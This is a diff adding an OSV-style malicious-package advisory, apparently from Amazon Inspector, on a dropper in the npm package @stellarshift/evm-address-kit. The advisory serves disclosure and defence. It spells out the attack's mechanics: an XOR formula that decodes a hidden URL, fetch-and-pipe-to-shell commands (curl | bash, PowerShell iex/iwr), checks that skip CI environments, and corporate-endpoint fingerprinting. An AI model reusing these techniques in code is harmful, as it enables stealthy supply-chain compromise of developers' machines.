@@ -1,0 +1,86 @@
+{
+  "modified": "2026-09-02T22:18:48Z",
+  "published": "2026-09-02T22:06:55Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-15823",
+  "summary": "Malicious code in @stellarshift/evm-address-kit (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (f8ad9957f1e31e5afe261cb73c0c5b76ff23a86b23ebae0704e7e2934be79979)\nThe package declares a `postinstall` script that invokes `syncRemoteManifest` in `lib/runtime/manifest-sync.js`. The destination URL is not present in cleartext: `lib/runtime/endpoint-registry.json` stores an integer array under an `ss-xor-v1` encoding with seed `evm-address-kit`, which `lib/runtime/config-resolver.js` decodes via `segments[i] ^ key.charCodeAt(i % key.length) ^ ((i * 7 + 13) \u0026 0xff)` at runtime to reconstruct an `https://` URL. The dropper then executes `curl -fsSL '\u003curl\u003e' | bash` on Linux/macOS or `powershell... iex (iwr -UseBasicParsing -Uri $uri).Content` on Windows in a detached child process, piping opaque remote content directly into a shell/PowerShell interpreter. Execution is gated by `dev-profile.js`: it aborts when common CI environment variables are set (`CI`, `GITHUB_ACTIONS`, `GITLAB_CI`, `JENKINS_URL`, `BUILDKITE`, `CIRCLECI`, `TF_BUILD`, `CONTINUOUS_INTEGRATION`) and, on darwin/win32, requires both a Lark/Feishu install (`/Applications/Lark.app`, `/Applications/Feishu.app`) and a FortiClient install (`Fortinet\\FortiClient`) to be present. The stated purpose of the package is EVM address checksumming, which does not justify runtime URL obfuscation, remote shell execution at install time, or corporate-workstation fingerprinting. The combination — install-time execution, obfuscated destination, CI evasion, and specific-vendor host fingerprinting — is a targeted install-time remote code execution dropper aimed at managed corporate endpoints running Lark/Feishu with FortiClient VPN.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@stellarshift/evm-address-kit"
+      },
+      "versions": [
+        "1.0.1",
+        "1.0.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "scripts/postinstall.js",
+              "sha256": "f1b4d751089f12d46838048efb93f16ff6f30b10d9d19d116021f79c504586c1",
+              "tlsh": "99711df402926b3171b2e3ac57478d06d4bb743236968280f5ccb1c5afed62c426acf9"
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@stellarshift/evm-address-kit/v/1.0.1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@stellarshift/evm-address-kit/v/1.0.3"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-019344",
+        "import_time": "2026-09-02T22:16:58.834511354Z",
+        "modified_time": "2026-09-02T22:07:28Z",
+        "sha256": "e9fbc812f7a857d9672e7f91884223a6975a519034b800c2c58cb4f3dddee588",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.1"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-019341",
+        "import_time": "2026-09-02T22:16:58.746842429Z",
+        "modified_time": "2026-09-02T22:06:55Z",
+        "sha256": "f8ad9957f1e31e5afe261cb73c0c5b76ff23a86b23ebae0704e7e2934be79979",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.3"
+        ]
+      }
+    ]
+  }
+}
